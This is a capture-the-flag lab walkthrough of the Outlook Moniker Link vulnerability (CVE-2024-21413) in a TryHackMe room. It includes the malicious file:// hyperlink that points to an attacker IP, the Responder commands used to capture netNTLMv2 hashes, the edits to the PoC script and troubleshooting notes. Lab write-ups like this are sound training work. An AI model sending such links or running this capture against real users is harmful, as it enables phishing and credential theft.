# Moniker Link (CVE-2024-21413) - Complete Walkthrough

## Overview

This walkthrough demonstrates the exploitation of **CVE-2024-21413 (Moniker Link)** in Microsoft Outlook. The objective is to send a specially crafted email containing a malicious Moniker Link that bypasses Outlook's Protected View and causes the victim's machine to authenticate to an attacker-controlled SMB server, resulting in a captured netNTLMv2 hash.

Unlike a traditional writeup, this walkthrough focuses on the actual execution process, troubleshooting methodology, mistakes encountered during the lab, and the reasoning behind each step.

---

# Lab Goal

Capture the victim's netNTLMv2 hash by exploiting Outlook's handling of Moniker Links.

Expected result:

```text
[SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
```

---

# Attack Flow

```text
Attacker
    │
    ▼
Create Malicious Email
    │
    ▼
Send Email
    │
    ▼
Victim Opens Email
    │
    ▼
Victim Clicks Moniker Link
    │
    ▼
Protected View Bypass
    │
    ▼
SMB Connection
    │
    ▼
NTLM Authentication
    │
    ▼
Hash Captured
```

---

# Step 1 - Start Responder

## Objective

Create an SMB listener capable of capturing NTLM authentication attempts.

## Command

```bash
sudo responder -I ens5
```

## Command Breakdown

| Component | Purpose                             |
| --------- | ----------------------------------- |
| responder | Launch Responder                    |
| -I        | Specify interface                   |
| ens5      | Network interface used by AttackBox |

## Expected Output

```text
[+] Listening for events...
```

At this stage Responder is waiting for incoming SMB authentication attempts.

---

# Step 2 - Open the Victim Machine

Open the victim machine from the TryHackMe split-screen environment.

Launch:

```text
Outlook
```

When prompted:

```text
I don't want to sign in or create an account
```

Click it.

Close any remaining setup popups.

The victim mailbox is already configured for the lab.

---

# Step 3 - Create the Exploit Script

Create a new file:

```bash
nano exploit.py
```

Paste the PoC provided in the room.

---

# Understanding the PoC

The critical section is:

```html
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

This hyperlink triggers the vulnerability.

### Why?

The link:

```text
file://
```

forces Windows to access a network resource.

The:

```text
!
```

causes Outlook to bypass Protected View.

---

# Step 4 - Configure the Mail Server

Locate:

```python
server = smtplib.SMTP('MAILSERVER', 25)
```

Replace with:

```python
server = smtplib.SMTP('10.49.184.226', 25)
```

## Why?

The room provides a dedicated SMTP server for email delivery.

Without this change the email cannot be sent.

---

# Step 5 - Configure the Moniker Link

Locate:

```html
file://ATTACKER_MACHINE/test!exploit
```

Replace:

```html
file://10.49.73.133/test!exploit
```

using the IP address of your AttackBox.

## Important

The SMTP server IP and AttackBox IP are NOT the same thing.

SMTP Server:

```text
10.49.184.226
```

AttackBox:

```text
10.49.73.133
```

This distinction became one of the major troubleshooting points during the lab.

---

# Step 6 - Send the Email

Run:

```bash
python3 exploit.py
```

Password:

```text
attacker
```

Expected output:

```text
Email delivered
```

The malicious email is now delivered to the victim mailbox.

---

# Step 7 - Open the Email

Return to Outlook.

Open the newly received message.

You should see:

```text
Click me
```

---

# Step 8 - Trigger the Vulnerability

Click:

```text
Click me
```

At this point:

```text
file://AttackBox/test!exploit
```

is processed by Outlook.

Protected View is bypassed.

Windows attempts to access:

```text
\\AttackBox\test
```

via SMB.

---

# Step 9 - Capture the Hash

Switch back to Responder.

Successful capture:

```text
[SMB] NTLMv2-SSP Client
[SMB] NTLMv2-SSP Username : THM-MONIKERLINK\tryhackme
```

Example:

```text
tryhackme::THM-MONIKERLINK:
e2df72a82ae914e5:
CB4DCCAF11404BBAA0CF746E955BD585:
...
```

Mission accomplished.

---

# Understanding What Happened

When the victim clicked:

```text
file://10.49.73.133/test!exploit
```

Windows attempted:

```text
\\10.49.73.133\test
```

SMB requires authentication.

Windows automatically performed NTLM authentication.

Responder captured the resulting netNTLMv2 hash.

---

# Packet Analysis

Wireshark shows the authentication process:

## Packet 1

```text
Session Setup Request
```

NTLM Negotiate.

---

## Packet 2

```text
NTLMSSP_CHALLENGE
```

Server challenge.

---

## Packet 3

```text
NTLMSSP_AUTH
```

Authentication response.

This packet contains:

```text
Username: tryhackme
Domain: THM-MONIKERLINK
```

and the NTLM response.

---

# Challenges Encountered

The lab did not work immediately.

Several issues had to be investigated and resolved.

---

# Challenge 1 - Responder Failed to Start

## Symptom

```text
Error starting TCP server on port 445
Error starting TCP server on port 139
```

## Investigation

Check port usage:

```bash
sudo ss -tulpn | grep -E '445|139'
```

Output:

```text
smbd
```

was already listening.

---

## Root Cause

Samba was occupying the SMB ports required by Responder.

---

## Resolution

Stop Samba:

```bash
sudo systemctl stop smbd
```

Verify:

```bash
sudo ss -tulpn | grep 445
```

No output should appear.

Restart Responder.

---

# Challenge 2 - No Hashes Appeared

## Symptom

Clicking the exploit link generated no NTLM capture.

Responder remained silent.

---

## Investigation

Review the exploit configuration:

```bash
grep file:// exploit.py
```

Output:

```html
file://10.49.184.226/test!exploit
```

---

## Root Cause

The SMTP server IP was mistakenly used as the SMB target.

The victim attempted to access:

```text
\\10.49.184.226\test
```

instead of the AttackBox.

Responder never received the connection.

---

## Resolution

Update the hyperlink:

```html
file://10.49.73.133/test!exploit
```

Resend the email.

---

# Challenge 3 - Outlook Error Message

## Symptom

Outlook displayed:

```text
We can't find \\IP\test!exploit
```

## Initial Assumption

The exploit had failed.

---

## Reality

This message actually indicated:

```text
Outlook opened the link
Windows attempted SMB access
```

The vulnerability was being triggered.

The problem was elsewhere.

---

## Lesson Learned

Error messages often provide evidence that an attack progressed further than expected.

Never assume an error means failure.

Investigate what happened before the error occurred.

---

# Challenge 4 - False Positive Hash Capture

## Symptom

Responder displayed:

```text
[SMTP] CRAM-MD5 Username : attacker@monikerlink.thm
```

instead of an NTLM hash.

---

## Root Cause

Responder captured authentication generated by the exploit script itself during SMTP login.

Not by the victim Outlook machine.

---

## Resolution

Ignore SMTP authentication logs and look specifically for:

```text
[SMB] NTLMv2-SSP
```

entries.

---

# Lessons Learned

This room demonstrates that:

* Outlook vulnerabilities can lead directly to credential theft.
* SMB authentication occurs automatically.
* NTLM hashes can be harvested without malware.
* A single hyperlink can initiate an authentication attack.
* Troubleshooting is often more valuable than following instructions.

---

# Skills Practiced

* Outlook exploitation
* Moniker Link abuse
* SMB authentication analysis
* NTLM authentication analysis
* Responder usage
* SMTP email delivery
* Wireshark traffic analysis
* Troubleshooting methodology
* Root cause analysis

---

# Final Result

Successfully:

✅ Sent a malicious Outlook email

✅ Bypassed Protected View

✅ Triggered SMB authentication

✅ Captured a victim netNTLMv2 hash

✅ Analyzed NTLM authentication traffic

✅ Troubleshot multiple lab issues

✅ Understood the complete attack chain behind CVE-2024-21413
